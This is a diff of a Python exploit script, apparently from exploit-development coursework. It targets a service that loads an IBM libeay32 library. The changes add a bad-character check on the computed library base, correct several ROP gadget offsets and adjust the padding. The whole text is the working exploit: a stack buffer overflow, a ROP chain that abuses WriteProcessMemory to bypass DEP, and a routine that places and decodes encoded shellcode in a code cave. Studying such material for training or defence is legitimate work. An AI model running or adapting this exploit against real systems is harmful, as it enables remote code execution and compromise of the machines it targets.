@@ -218,6 +218,7 @@ recover knowledge
 
 import argparse
 import socket
+import struct
 import sys
 from struct import pack
 
@@ -463,6 +464,16 @@ def main():
         functionOffset = 0x14E0
 
         libeay32ibm019 = exportedFunc - functionOffset
+
+        # If our base address is not favorable, log it and exit
+        BASE_ADDR_BAD = checkBadChars(pack("<L", libeay32ibm019))
+        if BASE_ADDR_BAD:
+            log(
+                f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))} contains bad chars",
+                level="-",
+            )
+            sys.exit(1)
+
         log(
             f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))}",
             level="+",
@@ -473,22 +484,22 @@ def main():
         ******************************* Stage 0: ROP Gadgets *******************************
         ************************************************************************************
         """
-        rop_inc_eax_ret = pack("<L", (libeay32ibm019 + 0x0000BC79))  # inc eax; ret
-        rop_pop_ecx_ret = pack("<L", (libeay32ibm019 + 0x0000117C))  # pop ecx; ret
-        rop_pop_eax_ret = pack("<L", (libeay32ibm019 + 0x00048DB7))  # pop eax; ret
-        rop_neg_eax_ret = pack("<L", (libeay32ibm019 + 0x0001D8C2))  # neg eax ; ret
-        rop_add_eax_ecx_ret = pack("<L", (libeay32ibm019 + 0x0001D0F0))  # add eax, ecx; ret
-        rop_xchg_eax_esp_ret = pack("<L", (libeay32ibm019 + 0x0003A003))  # xchg eax, esp ; ret
-        rop_mov_ptrEAX_ecx_ret = pack("<L", (libeay32ibm019 + 0x00001F7E))  # mov [eax], ecx ; ret
-        rop_add_ptrEAX_1_bh_ret = pack("<L", (libeay32ibm019 + 0x00001E8D))  # add [eax+1], bh; ret
-        rop_push_eax_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408DD))  # push eax; pop esi; ret
-        rop_push_esp_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408D6))  # push esp; pop esi; ret <- Save ESP to ESI
-        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (libeay32ibm019 + 0x0004A7B6))  # sub eax, ecx; pop ebx; ret
-        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000025B7))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
-        rop_int3_int3_int3_int3_int3_ret = pack("<L", (libeay32ibm019 + 0x00087E3B))  #  int3; int3; int3; int3; int3; ret; <- debugging
+        rop_inc_eax_ret = pack("<L", (libeay32ibm019 + 0x0000BC79))  # inc eax; ret [!!!] Verified
+        rop_neg_eax_ret = pack("<L", (libeay32ibm019 + 0x0001D8C2))  # neg eax ; ret [!!!] Verified
+        rop_pop_eax_ret = pack("<L", (libeay32ibm019 + 0x00048DB7))  # pop eax; ret [!!!] Verified
+        rop_pop_ecx_ret = pack("<L", (libeay32ibm019 + 0x000010C2))  # pop ecx; ret [o] Corrected
+        rop_add_eax_ecx_ret = pack("<L", (libeay32ibm019 + 0x0001D0F0))  # add eax, ecx; ret [!!!] Verified
+        rop_xchg_eax_esp_ret = pack("<L", (libeay32ibm019 + 0x0003A003))  # xchg eax, esp ; ret [!!!] Verified
+        rop_mov_ptrEAX_ecx_ret = pack("<L", (libeay32ibm019 + 0x00001F7E))  # mov dword [eax], ecx ; ret [!!!] Verified
+        rop_add_ptrEAX_1_bh_ret = pack("<L", (libeay32ibm019 + 0x0003F8F4))  # add byte [eax+0x00000001], bh ; ret [o] Corrected
+        rop_push_eax_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408DD))  # push eax; pop esi; ret [!!!] Verified
+        rop_push_esp_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x000408D6))  # push esp; pop esi; ret <- Save ESP to ESI [!!!] Verified
+        rop_sub_eax_ecx_pop_ebx_ret = pack("<L", (libeay32ibm019 + 0x0004A7B6))  # sub eax, ecx; pop ebx; ret [!!!] Verified
+        rop_mov_eax_esi_pop_esi_ret = pack("<L", (libeay32ibm019 + 0x00002541))  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI [o] Corrected
+        rop_int3_int3_int3_int3_ret = pack("<L", (libeay32ibm019 + 0x00087E3C))  #  int3; int3; int3; int3; ret; <- debugging [o] Corrected
         rop_mov_ecx_eax_mov_eax_esi_pop_esi_ret_0x10 = pack(
             "<L", (libeay32ibm019 + 0x0008876D)
-        )  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010
+        )  # mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010 [!!!] Verified
         """
         ************************************************************************************
         ************************************ Abuse WPM *************************************
@@ -506,7 +517,7 @@ def main():
         buf += pack("<i", 0x100)  # 2nd memcpy: size field
         buf += pack("<i", 0x0)  # 3rd memcpy: offset
         buf += pack("<i", 0x100)  # 3rd memcpy: size field
-        buf += bytearray([0x41] * 0x8)   # <-- Trouble area maybe, adjusted from 0x10
+        buf += bytearray([0x41] * 0x8)
 
         # psCommandBuffer
         # NOTE:: My code cave is larger than the book's 0x400
@@ -518,9 +529,9 @@ def main():
         wpm += pack("<L", (0xFFFFFFFF))  # pseudo Process handle
         wpm += pack("<L", (libeay32ibm019 + codeCaveOffset))  # Code cave address
         wpm += pack("<L", (0x41414141))  # dummy lpBuffer (Stack address)
-        wpm += pack("<L", (0xcccccccc))  # dummy nSize
+        wpm += pack("<L", (0xCCCCCCCC))  # dummy nSize
         wpm += pack("<L", (libeay32ibm019 + 0xE401C))  # lpNumberOfBytesWritten = libBase + offset of writable DWORD in .data
-        wpm += b"A" * 0xe
+        wpm += b"A" * 0x10
 
         offset = b"A" * (276 - len(wpm))
         # 1803_1011 (IGNORE, fixed):
@@ -539,6 +550,7 @@ def main():
         #                         restarting the PC gave me a new base address and so now it works as expected
         # eip = pack("<L", (libeay32ibm019 + 0x00087E3B))  # (0x03117e3b) int3; int3; int3; int3; int3; ret; <- debugging
         eip = rop_push_esp_pop_esi_ret  # <- Save ESP to ESI
+        # eip = rop_int3_int3_int3_int3_ret  # <- Debugging
         # eip = pack("<L", (0x41424345))  # push esp; pop esi; ret <- Save ESP to ESI
 
         # ! DEBUG: eip: 0x030d08d6
@@ -549,7 +561,7 @@ def main():
         # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6
 
         # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
-        log(f"DEBUG: eip: {hex(libeay32ibm019 + 0x000408D6)}", level="!!!")
+        log(f"DEBUG: sent_eip: {hex(struct.unpack('<L', eip)[0])}", level="!!!")
 
         """
         ************************************************************************************
@@ -559,7 +571,7 @@ def main():
 
         # Patching lpBuffer, need it to point to our shellcode address on stack
         rop = rop_mov_eax_esi_pop_esi_ret  # mov eax, esi; pop esi; ret  | Save ESP to EAX+ESI
-        rop += rop_int3_int3_int3_int3_int3_ret
+        rop += rop_int3_int3_int3_int3_ret
         rop += pack("<L", (0x42424242))  # dummy value
         rop += rop_pop_ecx_ret  # pop ecx; ret
         rop += pack("<L", (0x88888888))  # push huge value to "subtract"
@@ -614,7 +626,7 @@ def main():
         *************************** Stage 1d: Shellcode Decoding ***************************
         ************************************************************************************
         """
-        rop += rop_int3_int3_int3_int3_int3_ret  # int3; int3; int3; int3; int3; ret; <- debugging
+        rop += rop_int3_int3_int3_int3_ret  # int3; int3; int3; int3; int3; ret; <- debugging
         rop += rop_pop_ecx_ret  # pop ecx ; ret
         rop += pack("<L", (0xFFFFFFFF))  # negative offset -1
         rop += rop_sub_eax_ecx_pop_ebx_ret  # sub eax, ecx; pop ebx; ret
@@ -647,6 +659,7 @@ def main():
         #          which is not available in this case as WPM restores the default protections which were read/exec
         offset2 = b"C" * (0x600 - len(rop))  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
         shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
+
         log("Encoded Shellcode", level="+")
         printBuffer(shellcode, width="db")
 
@@ -654,7 +667,10 @@ def main():
         # The ropchain to decode the shellcode is to be placed before the ESP alignment section
 
         # Padding (Followed the vid)
-        padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
+        # padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
+        # TEST CODE
+        padding_len = 0x1000 - 276 - 4 - len(rop) - len(offset2) - len(shellcode)
+        padding = (b"\xde\xad\xc0\xde" * ((padding_len + 3) // 4))[:padding_len]
 
         # Prepare buffer + add checksum
         buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
